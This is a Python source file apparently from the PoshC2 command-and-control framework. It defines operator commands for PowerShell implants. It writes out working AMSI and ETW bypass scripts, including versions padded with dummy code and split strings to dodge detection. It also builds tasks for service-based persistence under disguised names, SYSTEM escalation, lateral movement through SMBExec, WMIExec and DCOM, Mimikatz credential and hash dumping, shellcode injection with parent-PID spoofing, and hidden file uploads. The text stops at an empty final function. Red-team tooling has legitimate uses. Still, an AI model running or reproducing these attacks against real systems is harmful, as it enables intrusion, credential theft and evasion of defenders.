import base64
import os
import re
import traceback

from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style

from poshc2 import Colours
from poshc2.Utils import argp, load_file, get_first_url, get_first_domainfront_header, yes_no_prompt, command, \
    get_command_word
from poshc2.client.Alias import ps_alias, ps_replace
from poshc2.client.Opsec import ps_opsec
from poshc2.client.cli.AutosuggestionAggregator import AutosuggestionAggregator
from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter, FirstWordCompleter
from poshc2.client.cli.PoshExamplesAutosuggestions import AutoSuggestFromPoshExamples
from poshc2.client.command_handlers.CommonCommands import common_implant_commands, common_implant_commands_help, \
    common_implant_examples, common_block_help
from poshc2.server.AutoLoads import check_module_loaded, run_powershell_autoloads
from poshc2.server.Config import PayloadsDirectory, PoshProjectDirectory, DomainFrontHeader, PayloadCommsHost
from poshc2.server.Core import print_bad, creds, print_good, search_help, print_command_help, gzipdata
from poshc2.server.ImplantType import ImplantType
from poshc2.server.PowerStatus import get_powerstatus
from poshc2.server.database.Helpers import select_first, insert_object, update_object, get_implant, get_power_status, \
    get_new_implant_url
from poshc2.server.database.Model import C2Server, NewTask, Implant, URL
from poshc2.server.payloads.Payloads import Payloads

commands = {}
commands.update(common_implant_commands)
commands_help = {}
commands_help.update(common_implant_commands_help)
examples = []
examples.extend(common_implant_examples)
block_help = {}
block_help.update(common_block_help)

style = Style.from_dict({
    '': '#1f48d1',
})

autosuggester = AutoSuggestFromPoshExamples(examples)


def ps_prompt(prefix):
    session = PromptSession(
        history=FileHistory(f'{PoshProjectDirectory}/{ImplantType.PowerShellHttp.get_history_file()}'),
        auto_suggest=AutosuggestionAggregator([AutoSuggestFromHistory(), autosuggester]), style=style)
    completions = list(commands.keys())
    completions.extend(examples)
    return session.prompt(f'{prefix}> ', completer=FirstWordCompleter(completions, WORD=True))


def handle_ps_command(command, user, implant_id):
    try:
        check_module_loaded("Stage2-Core.ps1", implant_id, user)
    except Exception as e:
        print_bad(f"Error loading Stage2-Core.ps1: {e}")

    command = command.strip()

    if command.startswith("sharp"):
        check = input(Colours.RED + "\nDid you mean to run this sharp command in a PS implant? y/N ")

        if check.lower() != "y":
            return

    for alias in ps_alias:
        if command.startswith(alias[0]):
            command.replace(alias[0], alias[1])

    for alias in ps_replace:
        if command.startswith(alias[0]):
            command = command.replace(alias[0], alias[1])

    command = command.strip()
    run_powershell_autoloads(command, implant_id, user)

    # opsec failures
    for opsec in ps_opsec:
        if opsec == command[:len(opsec)]:
            print_bad("**OPSEC Warning**")
            ri = input("Do you want to continue running - %s? (y/N) " % command)

            if ri.lower() == "n":
                command = ""

            if ri == "":
                command = ""

            break

    command_word = get_command_word(command)

    if command_word in commands:
        commands[command_word](user, command, implant_id)
        return

    if command:
        commands["shell"](user, command, implant_id)


def get_commands():
    return commands.keys()


@command(commands, commands_help, examples, block_help)
def do_disable_amsi_1(user, command, implant_id):
    """
    Disables / wipes the amsiContext

    ref: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass

    Examples:
        disable-amsi-1
    """

    command = """
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}}
$d = $c.GetFields('NonPublic,Static')
ForEach($e in $d) {if ($e.Name -like "*Context") {$f = $e}}
$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
"""

    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_disable_amsi_2(user, command, implant_id):
    """
    Disables / wipes the amsiContext

    ref: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass

    With support from AI

    Examples:
        disable-amsi-2
    """

    command = """
# Dummy function to simulate some unrelated logic
function Test-DummyFunction {
    Write-Output "Starting dummy function..."
    $x = 10
    $y = 20
    $z = $x + $y
    Write-Output "The sum of $x and $y is $z"
}

# Another dummy function
function Another-DummyFunction {
    Write-Output "Running another dummy function..."
    $a = "Hello"
    $b = "World"
    $c = "$a, $b!"
    Write-Output $c
}

# Main script begins
Write-Output "Initializing the main script..."
Test-DummyFunction
Another-DummyFunction

# Reflective assembly analysis
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c = $b
        Write-Output "Found matching type: $($b.Name)"
    }
}

# Retrieve specific fields
$d = $c.GetFields('NonPublic,Static')
ForEach($e in $d) {
    if ($e.Name -like "*Context") {
        $f = $e
        Write-Output "Found matching field: $($e.Name)"
    }
}

# Manipulate field value
$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
Write-Output "Preparing to copy buffer to memory..."
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
Write-Output "Buffer copied to memory."

# Additional dummy logic
function Final-DummyFunction {
    Write-Output "Executing final dummy function..."
    $numbers = 1..5
    foreach ($num in $numbers) {
        Write-Output "Number: $num"
    }
}

# Main script ends
Final-DummyFunction
Write-Output "Script execution completed."
"""

    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)



@command(commands, commands_help, examples, block_help)
def do_disable_etw_1(user, command, implant_id):
    """
    Disables the PSEtwLogProvider

    ref: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/etw-block
    ref: https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32

    Examples:
        disable-etw-1
    """

    command = """
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
"""

    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_disable_etw_2(user, command, implant_id):
    """
    Disables the PSEtwLogProvider

    ref: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/etw-block
    ref: https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32

    With support from AI

    Examples:
        disable-etw-2
    """

    command = """
# Bloat: Adding unnecessary variables and functions
function Get-ObfuscationLevel {
    param (
        [int]$level = 1
    )
    return $level * 2
}

$dummyVar1 = "Lorem ipsum dolor sit amet"
$dummyVar2 = "consectetur adipiscing elit"
$dummyVar3 = "sed do eiusmod tempor incididunt ut labore et dolore magna aliqua"

# Obfuscated and bloated main code
function Invoke-MainFunction {
    # More bloat: Unnecessary loops and conditions
    for ($i = 0; $i -lt (Get-ObfuscationLevel 3); $i++) {
        if ($i % 2 -eq 0) {
            [void]($dummyVar1 -match $dummyVar2)
        } else {
            [void]($dummyVar3 -match $dummyVar1)
        }
    }

    # Actual obfuscated code
    $assemblyLoad = 'L' + 'oadWithPartialName'
    $typeGet = 'Get' + 'Type'
    $fieldGet = 'Get' + 'Field'
    $setValue = 'Set' + 'Value'
    $nonPublicInstance = 'Non' + 'Public,' + 'Instance'
    $nonPublicStatic = 'Non' + 'Public,' + 'Static'

    [Reflection.Assembly]::$assemblyLoad('System.Core').$typeGet('System.Diagnostics.Eventing.EventProvider').$fieldGet('m_enabled', $nonPublicInstance).$setValue(
        [Ref].Assembly.$typeGet('System.Management.Automation.Tracing.PSEtwLogProvider').$fieldGet('etwProvider', $nonPublicStatic).GetValue($null),
        0
    )
}

Invoke-MainFunction
"""

    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)

@command(commands, commands_help, examples, block_help)
def do_install_servicelevel_persistence(user, command, implant_id):
    """
    [Requires Elevation]
    Obtains persistence by installing a bat file payload to be run via cmd.exe as a service.

    The service is created using sc.exe with the name 'CPUpdater' and Displayname 'CheckpointServiceUpdater'.
    The operator is prompted for what batch file payload to use.

    Examples:
        install-servicelevel-persistence
    """
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()

    cmd = f"sc.exe create CPUpdater binpath= 'cmd /c {payload}' Displayname= CheckpointServiceUpdater start= auto"
    new_task = NewTask(
        implant_id=implant_id,
        command=cmd,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_remove_servicelevel_persistence(user, commmand, implant_id):
    """
    [Requires Elevation]
    Removes the CPUpdater service created by install-servicelevel-persistence.

    Uses sc.exe.

    Examples:
        remove-servicelevel-persistence
    """
    new_task = NewTask(
        implant_id=implant_id,
        command="sc.exe delete CPUpdater",
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, name="pwd")
def do_get_implant_working_directory(user, command, implant_id):
    """
    Gets the current working directory for the implant.

    Examples:
        pwd
        get-implant-working-directory
    """
    new_task = NewTask(
        implant_id=implant_id,
        command="pwd",
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, name="pwd")
def do_download_file(user, command, implant_id):
    """
    Downloads a file over the C2.

    Examples:
        download-file c:\\temp\\file.exe
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)

@command(commands, commands_help, examples, block_help)
def do_get_system(user, command, implant_id):
    """
    [Requires Elevation]
    Obtains a LOCAL SYSTEM implant.

    Uses sc.exe to create a service called 'CPUpdaterMisc' which uses cmd.exe to
    launch a specified batch file payload.

    The operator is prompted for what batch file payload to use.

    Examples:
        get-system
    """
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()

        cmd = f"sc.exe create CPUpdaterMisc binpath= 'cmd /c {payload}' Displayname= CheckpointServiceModule start= auto"
        new_task = NewTask(
            implant_id=implant_id,
            command=cmd,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
        cmd = "sc.exe start CPUpdaterMisc"
        new_task = NewTask(
            implant_id=implant_id,
            command=cmd,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
        cmd = "sc.exe delete CPUpdaterMisc"
        new_task = NewTask(
            implant_id=implant_id,
            command=cmd,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)


@creds()
@command(commands, commands_help, examples, block_help, name="invoke-smbexec")
def do_invoke_psexec(user, command, implant_id):
    """
    Uses Invoke-SMBExec to run PSExec-like functionality against the target.

    https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1

    Requires privileged access on the target as the user running the command.

    Aliased as invoke-smbexec and invoke-psexec.

    Examples:
        invoke-psexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
    """
    check_module_loaded("Invoke-SMBExec.ps1", implant_id, user)
    params = re.compile("invoke-smbexec |invoke-psexec ", re.IGNORECASE)
    params = params.sub("", command)
    cmd = f"invoke-smbexec {params}"
    new_task = NewTask(
        implant_id=implant_id,
        command=cmd,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@creds()
@command(commands, commands_help, examples, block_help, name="invoke-smbexecpayload")
def do_invoke_psexec_payload(user, command, implant_id):
    """
    Uses Invoke-SMBExec to run PSExec-like functionality against the target,
    prompting for a payload to run.

    https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1

    Requires privileged access on the target as the user running the command.

    The operator is prompted for what batch file payload to use.

    Aliased as invoke-smbexecpayload and invoke-psexecpayload.

    Examples:
        invoke-psexec-payload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional> -credid <credid-optional>
    """
    check_module_loaded("Invoke-PsExec.ps1", implant_id, user)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()

        params = re.compile("invoke-psexec-payload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = f"invoke-psexec {params} -command \"{payload}\""
        new_task = NewTask(
            implant_id=implant_id,
            command=cmd,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
    else:
        print_bad(f"Payload not found: {path}")
        return


@creds()
@command(commands, commands_help, examples, block_help)
def do_invoke_wmiexec(user, command, implant_id):
    """
    Uses Invoke-WMIExec to execute a command using WMI on a target.

    https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1

    Requires privileged access on the target as the user running the command.

    Examples:
        invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -command <cmd>
    """
    check_module_loaded("Invoke-WMIExec.ps1", implant_id, user)
    params = re.compile("invoke-wmiexec ", re.IGNORECASE)
    params = params.sub("", command)
    cmd = f"invoke-wmiexec {params}"
    new_task = NewTask(
        implant_id=implant_id,
        command=cmd,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@creds()
@command(commands, commands_help, examples, block_help)
def do_invoke_wmi_js_payload(user, command, implant_id):
    """
    Uses Invoke-WMIExec to execute a DotNet2JS HTTP payload using WMI on a target.

    https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1

    Requires privileged access on the target as the user running the command.

    The operator is prompted for what shellcode file payload to use.

    Examples:
        invoke-wmi-js-payload -target <ip> -domain <dom> -user <user> -pass '<pass>' -credid <credid-optional>
    """
    check_module_loaded("New-JScriptShell.ps1", implant_id, user)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()

        params = re.compile("invoke-wmi-js-payload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = f"$Shellcode64=\"{payload}\" #{path}"
        new_task = NewTask(
            implant_id=implant_id,
            command=cmd,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
        cmd = f"new-jscriptshell {params} -payload $Shellcode64"
        new_task = NewTask(
            implant_id=implant_id,
            command=cmd,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
    else:
        print_bad(f"Payload not found: {path}")
        return


@creds()
@command(commands, commands_help, examples, block_help)
def do_invoke_wmi_payload(user, command, implant_id):
    """
    Uses Invoke-WMIExec to execute a payload using WMI on a target.

    https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1

    Requires privileged access on the target as the user running the command.

    The operator is prompted for what batch file payload to use.

    Examples:
        invoke-wmi-payload -target <ip> -domain <dom> -user <user> -pass '<pass>' -credid <credid-optional>
    """
    check_module_loaded("Invoke-WMIExec.ps1", implant_id, user)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()

        params = re.compile("invoke-wmi-payload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = f"invoke-wmiexec {params} -command \"{payload}\""
        new_task = NewTask(
            implant_id=implant_id,
            command=cmd,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
    else:
        print_bad(f"Payload not found: {path}")
        return


@command(commands, commands_help, examples, block_help, name="invoke-mimikatz")
def do_invoke_mimikatz(user, command, implant_id):
    """
    Uses Invoke-Mimikatz to run mimikatz on the target

    https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1

    Requires privileged on the target to run the command and will store the output in the DB

    Examples:
        invoke-mimikatz -command '"sekurlsa::logonpasswords"'
        invoke-mimikatz -command '"privilege::debug" "lsadump::sam"'
        invoke-mimikatz -command '"privilege::debug" "lsadump::lsa"'
        invoke-mimikatz -command '"privilege::debug" "lsadump::cache"'
        invoke-mimikatz -command '"privilege::debug" "lsadump::secrets"'
        invoke-mimikatz -command '"ts::multirdp"'
        invoke-mimikatz -command '"privilege::debug"'
        invoke-mimikatz -command '"crypto::capi"'
        invoke-mimikatz -command '"crypto::certificates /export"'
        invoke-mimikatz -command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:c:\\temp\\run.bat"'
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)

@command(commands, commands_help, examples, block_help)
def do_invoke_dcom_payload(user, command, implant_id):
    """
    Uses DCOM to launch a specified payload using a CLSID for MMC20.Application.

    The operator is prompted for what batch file payload to use.

    Uses cmd.exe to launch the payload.

    Examples:
        invoke-dcom-payload -target <ip>
    """
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()

        p = re.compile(r'(?<=-target.).*')
        target = re.search(p, command).group()
        cmd = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c %s\",\"7\")" % (
        target, payload)
        new_task = NewTask(
            implant_id=implant_id,
            command=cmd,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
    else:
        print_bad(f"Payload not found: {path}")
        return


@creds(accept_hashes=False)
@command(commands, commands_help, examples, block_help)
def do_invoke_runas(user, command, implant_id):
    """
    Uses a custom PowerShell equivalent to runas.exe to run a command as the specified user.
    Examples:
        invoke-runas -user <user> -password '<pass>' -domain <dom> -command c:\\windows\\system32\\cmd.exe -args " /c calc.exe"
    """
    check_module_loaded("Invoke-RunAs.ps1", implant_id, user)
    params = re.compile("invoke-runas ", re.IGNORECASE)
    params = params.sub("", command)
    cmd = f"invoke-runas {params}"
    new_task = NewTask(
        implant_id=implant_id,
        command=cmd,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@creds(accept_hashes=False)
@command(commands, commands_help, examples, block_help)
def do_invoke_runas_payload(user, command, implant_id):
    """
    Uses a custom PowerShell equivalent to runas.exe to run a batch payload as the specified user.

    The operator is prompted for what batch file payload to use.

    Examples:
        invoke-runas-payload -user <user> -password '<pass>' -domain <dom> -credid <credid-optional>
    """
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    if os.path.isfile(path):
        with open(path, "r") as p:
            payload = p.read()

        cmd = f"$proxypayload = \"{payload}\""
        new_task = NewTask(
            implant_id=implant_id,
            command=cmd,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
        check_module_loaded("Invoke-RunAs.ps1", implant_id, user)
        params = re.compile("invoke-runas-payload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = f"invoke-runas {params} -command $proxypayload"
        new_task = NewTask(
            implant_id=implant_id,
            command=cmd,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
    else:
        print_bad(f"Payload not found: {path}")
        return


@command(commands, commands_help, examples, block_help)
def do_get_pid(user, command, implant_id):
    """
    Get the PID of the current implant.

    Examples:
        get-pid
    """
    implant = get_implant(implant_id)
    print(implant.process_id)


@command(commands, commands_help, examples, block_help)
def do_upload_file(user, command, implant_id):
    """
    Uploads a file to the server.

    Hides the file by default. Execution without args will prompt with a filepath completer.

    Examples:
        upload-file
        upload-file -source /tmp/test.exe -destination 'c:\\temp\\test.exe' -nothidden
    """
    if command == "upload-file":
        session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.upload-history'),
                                auto_suggest=AutoSuggestFromHistory(), style=style)

        try:
            source = session.prompt("Location file to upload: ",
                                    completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        except KeyboardInterrupt:
            return

        while not os.path.isfile(source):
            print_bad(f"File does not exist: {source}")
            source = session.prompt("Location file to upload: ",
                                    completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source

        destination = session.prompt("Location to upload to: ")
        nothidden = yes_no_prompt("Do not hide the file:")
    else:
        args = argp(command)
        source = args.source
        destination = args.destination
        nothidden = args.nothidden

    try:
        print(f"Uploading {source} to {destination}")

        if nothidden:
            upload_command = f"upload-file {source} {destination} -NotHidden ${nothidden}"
        else:
            upload_command = f"upload-file {source} {destination}"

        new_task = NewTask(
            implant_id=implant_id,
            command=upload_command,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
    except Exception as e:
        print_bad(f"Error with source file: {e}")
        traceback.print_exc()


@command(commands, commands_help, examples, block_help, name="exit")
def do_kill_implant(user, command, implant_id):
    """
    Terminates this implant while leaving the process running and hides it from the ImplantHandler list.

    Examples:
        kill-implant
    """
    implant = get_implant(implant_id)
    print_bad(
        "**OPSEC Warning** - kill-implant terminates the current thread not the entire process, if you want to kill the process use kill-process")
    ri = input(f"Are you sure you want to remove the implant ID {implant.numeric_id}? (Y/n) ")

    if ri == "" or ri.lower() == "y":
        new_task = NewTask(
            implant_id=implant_id,
            command="exit",
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
        update_object(Implant, {Implant.alive: "No"}, {Implant.id: implant_id})
    else:
        print("Implant not removed")


@command(commands, commands_help, examples, block_help)
def do_migrate(user, command, implant_id):
    """
    Migrates into a new process by injecting shellcode into that process.

    Can either migrate into an already running process by specifying a PID or
    create a new process and inject into it, with an optional parent PID to spoof.

    New processes can be created suspended to prevent execution if desired.

    RtlCreateUserThread can optionally be used to create the remote thread instead of CreateRemoteThread.

    Examples:
        migrate
        migrate -procid 4444
        migrate -procpath c:\\windows\\system32\\netsh.exe -suspended -RtlCreateUserThread
        migrate -procpath c:\\windows\\system32\\svchost.exe -suspended
    """
    params = re.compile("migrate", re.IGNORECASE)
    params = params.sub("", command)
    implant = get_implant(implant_id)
    implant_type = ImplantType.get(implant.type)

    if implant.architecture == "AMD64":
        arch = "64"
    else:
        arch = "86"

    if implant_type == ImplantType.PowerShellHttpDaisy:
        daisyname = input("Name required: ")
        path = f"{PoshProjectDirectory}payloads/{daisyname}Posh_v4_x{arch}_Shellcode.bin"
        shellcodefile = load_file(path)
    elif implant_type == ImplantType.PowerShellHttpProxy:
        path = f"{PoshProjectDirectory}payloads/ProxyPosh_v4_x{arch}_Shellcode.bin"
        shellcodefile = load_file(path)
    elif implant_type.is_powershell_implant():
        path = f"{PoshProjectDirectory}payloads/Posh_v4_x{arch}_Shellcode.bin"
        shellcodefile = load_file(path)
    else:
        print_bad(f"Unknown migration implant type: {implant_type}")
        return

    check_module_loaded("Inject-Shellcode.ps1", implant_id, user)
    cmd = f"$Shellcode{arch}=\"{base64.b64encode(shellcodefile).decode('utf-8')}\" #{os.path.basename(path)}"
    new_task = NewTask(
        implant_id=implant_id,
        command=cmd,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)

    cmd = f"Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode{arch})){params}"
    new_task = NewTask(
        implant_id=implant_id,
        command=cmd,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_invoke_daisychain(user, command, implant_id):
    """
    Calls Invoke-Daisychain to create a HTTP server in this implant
    for daisy-chaining implants.

    If unfamiliar with daisy-chaining, start-daisy is a more friendly way
    to start daisy chaining implants.

    Examples:
        invoke-daisychain
    """
    check_module_loaded("Invoke-DaisyChain.ps1", implant_id, user)
    urls = f"{select_first(C2Server.urls)},{select_first(C2Server.socks_urls)}"
    cmd = f"{command} -URLs '{urls}'"
    new_task = NewTask(
        implant_id=implant_id,
        command=cmd,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    update_object(Implant, {Implant.label: "DAISY"}, {Implant.id: implant_id})
    print("Use create-daisy-payload on implant handler to generate payloads.")


@command(commands, commands_help, examples, block_help)
def do_inject_shellcode(user, command, implant_id):
    """
    Inject shellcode into a target process, obtaining an implant in that process.

    Prompts for the shellcode file to use.
    Can either provide an executable to run and an optional parent PID to spoof,
    or the PID of an already running process.

    New processes can be created suspended to prevent execution if desired.

    RtlCreateUserThread can optionally be used to create the remote thread instead of CreateRemoteThread.

    Examples:
        inject-shellcode -x86 -procid 5634 -parentId 1111
        inject-shellcode -x64 -parentId 1111 -procpath 'c:\\windows\\system32\\svchost.exe' -suspended
    """
    params = re.compile("inject-shellcode", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded("Inject-Shellcode.ps1", implant_id, user)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ",
                              completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    try:
        shellcodefile = load_file(path)

        if shellcodefile is not None:
            arch = "64"
            gzip_shellcode = gzipdata(shellcodefile)
            cmd = f"$Shellcode{arch}=\"{gzip_shellcode}\" #{os.path.basename(path)}"
            new_task = NewTask(
                implant_id=implant_id,
                command=cmd,
                user=user,
                child_implant_id=None
            )

            insert_object(new_task)
            cmd = f"Inject-Shellcode -Shellcode (gzip-decompress($Shellcode{arch})){params}"
            new_task = NewTask(
                implant_id=implant_id,
                command=cmd,
                user=user,
                child_implant_id=None
            )

            insert_object(new_task)
    except Exception as e:
        print_bad(f"Error loading file: {e}")


@command(commands, commands_help, examples, block_help)
def do_invoke_shellcode(user, command, implant_id):
    """
    Invoke shellcode into a target process, obtaining an implant in that process.

    Prompts for the shellcode file to use.
    Can either provide an executable to run and an optional parent PID to spoof,
    or the PID of an already running process.

    New processes can be created suspended to prevent execution if desired.

    Examples:
        invoke-shellcode -processid 5634
    """
    params = re.compile("invoke-shellcode", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded("Invoke-Shellcode.ps1", implant_id, user)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ",
                              completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    try:
        shellcodefile = load_file(path)

        if shellcodefile is not None:
            arch = "64"
            gzip_shellcode = gzipdata(shellcodefile)
            cmd = f"$Shellcode{arch}=\"{gzip_shellcode}\" #{os.path.basename(path)}"
            new_task = NewTask(
                implant_id=implant_id,
                command=cmd,
                user=user,
                child_implant_id=None
            )

            insert_object(new_task)
            cmd = f"Invoke-Shellcode -Force -Shellcode (gzip-decompress($Shellcode{arch})){params}"
            new_task = NewTask(
                implant_id=implant_id,
                command=cmd,
                user=user,
                child_implant_id=None
            )

            insert_object(new_task)
    except Exception as e:
        print_bad(f"Error loading file: {e}")


@command(commands, commands_help, examples, block_help)
def do_ps(user, command, implant_id):
    """
    Gets the process listing for current host, displaying more information
    than a standard PowerShell Get-Process.

    Examples:
        ps
    """
    new_task = NewTask(
        implant_id=implant_id,
        command="get-processlist",
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_hashdump(user, command, implant_id):
    """
    Extract password hashes from the local SAM.

    Uses Invoke-Mimikatz.ps1 to run "lsadump::sam".

    https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1

    Examples:
        hashdump
    """
    check_module_loaded("Invoke-Mimikatz.ps1", implant_id, user)
    new_task = NewTask(
        implant_id=implant_id,
        command="Invoke-Mimikatz -Command '\"lsadump::sam\"'",
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_stop_daisy(user, command, implant_id):
    """
    Stop the Daisy HTTP server in this implant, if running.

    Examples:
        stop-daisy
    """
    update_object(Implant, {Implant.label: ""}, {Implant.id: implant_id})
    new_task = NewTask(
        implant_id=implant_id,
        command=command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_reverse_dns(user, command, implant_id):
    """
    Perform a reverse DNS lookup on an IP address.

    Examples:
        reverse-dns 10.0.0.1
    """
